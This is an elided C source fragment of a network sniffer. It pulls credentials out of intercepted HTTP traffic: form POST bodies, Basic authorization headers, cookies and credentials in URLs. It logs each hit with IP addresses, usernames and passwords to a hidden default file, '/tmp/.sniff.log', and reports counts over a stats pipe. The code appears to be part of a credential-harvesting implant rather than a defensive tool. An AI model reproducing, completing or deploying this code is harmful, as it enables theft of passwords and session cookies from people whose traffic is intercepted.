...
static void flush_hits(void)
{
    ...
    for (i = 0; i < hit_count; i++) {
        ...
        switch (h->type) {
            case SNIFF_TYPE_POST_CRED:  type_str = "POST";  break;
            case SNIFF_TYPE_BASIC_AUTH: type_str = "BASIC"; break;
            case SNIFF_TYPE_COOKIE:     type_str = "COOKIE"; break;
            case SNIFF_TYPE_URL_CRED:   type_str = "URL";   break;
            default:                    type_str = "UNK";   break;
        }
        fprintf(f, "%u|%s|%d.%d.%d.%d|%d.%d.%d.%d:%d|%s|%s\n",
                h->timestamp,
                type_str,
                       ...
                       const char *user, const char *pass)
{
    ...
    if (stats_wr_fd >= 0) {
        ...
        int hlen;
        switch (hit_type) {
            case SNIFF_TYPE_POST_CRED:  tstr = "post";   break;
            case SNIFF_TYPE_BASIC_AUTH: tstr = "basic";  break;
            case SNIFF_TYPE_COOKIE:     tstr = "cookie"; break;
            case SNIFF_TYPE_URL_CRED:   tstr = "url";    break;
            default:                    tstr = "unk";    break;
        }
        hlen = snprintf(hbuf, sizeof(hbuf),
            "SNIFF_HIT|%s|%d.%d.%d.%d|%d.%d.%d.%d:%d|%s|%s\n",
            tstr,
                             ...
                             const char *payload, int plen)
{
    ...
    {
        const char *ct = ci_memmem(payload, (int)(body - payload), "content-type:", 13);
        if (ct) {
            if (!ci_memmem(ct, 80, "urlencoded", 10) && !ci_memmem(ct, 80, "form", 4))
                return;
        }
    }
                             ...
                             const char *payload, int plen)
{
    ...
    auth = ci_memmem(payload, plen, "authorization: basic ", 21);
    if (!auth) return;
                          ...
                          const char *payload, int plen)
{
    ...
    cookie = ci_memmem(payload, plen, "cookie:", 7);
    if (!cookie) return;
    cookie += 7;
    while (*cookie == ' ') cookie++;
        ...
        if (flush_requested) {
            ...
            if (stats_wr_fd >= 0) {
                ...
                int slen = snprintf(sbuf, sizeof(sbuf),
                    "SNIFF|post:%u|basic:%u|cookie:%u|url:%u|total:%u\n",
...
void sniffer_init(const char *logpath)
{
    ...
    if (!logpath || !logpath[0]) logpath = "/tmp/.sniff.log";
